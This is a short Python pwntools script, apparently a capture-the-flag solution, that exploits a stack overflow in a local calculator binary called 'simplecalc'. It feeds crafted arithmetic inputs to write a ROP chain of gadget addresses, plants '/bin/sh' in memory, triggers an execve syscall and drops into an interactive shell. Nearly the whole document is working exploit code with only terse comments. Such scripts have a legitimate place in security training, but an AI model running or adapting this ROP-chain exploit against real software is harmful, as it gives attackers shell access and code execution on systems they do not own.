from pwn import *

#send program input so that it subtracts 100 from "add", saves it, then saves 0, because it will
# store these two values next to each other in 64 bit memory
def sendAdd(add):
    target.sendline(b"2")
    target.sendline(add)
    target.sendline(b"100")
    target.sendline(b"2")
    target.sendline(b"1000")
    target.sendline(b"1000")
    
target = process('./simplecalc')
# gdb.attach(target, gdbscript = 'b *0x000000000040154a')

# number of calculations
target.sendline(b"150")

# need 18 values saved until we reach return address
for i in range(0, 18):
    target.sendline(b"2")
    target.sendline(b"1000")
    target.sendline(b"1000")

# rop chain begins where we send addresses of gadgets
sendAdd("4512664") # pop rax
sendAdd("7089316") # bss add
sendAdd("4422377") #pop rdx
target.sendline(b"2") # setting up /bin/sh\0
target.sendline(b"1852400275") # decimal form of /bin/sh\0
target.sendline(b"100")
target.sendline(b"2")
target.sendline(b"6845331")
target.sendline(b"100")
sendAdd("4477650")
sendAdd("4512664") # pop rax
sendAdd("159")
sendAdd("4422377") # pop rdx
sendAdd("100")
sendAdd("4228721") #pop rbx
sendAdd("100")
sendAdd("4951931") # pop rcx
sendAdd("7089316")
sendAdd("4201431") #pop rdi
sendAdd("7089316")
sendAdd("4201707") # pop rsi
sendAdd("100")
sendAdd("4195564")

# save and exit which will let our program exit and execute what we want
target.sendline(b"5")


target.interactive()
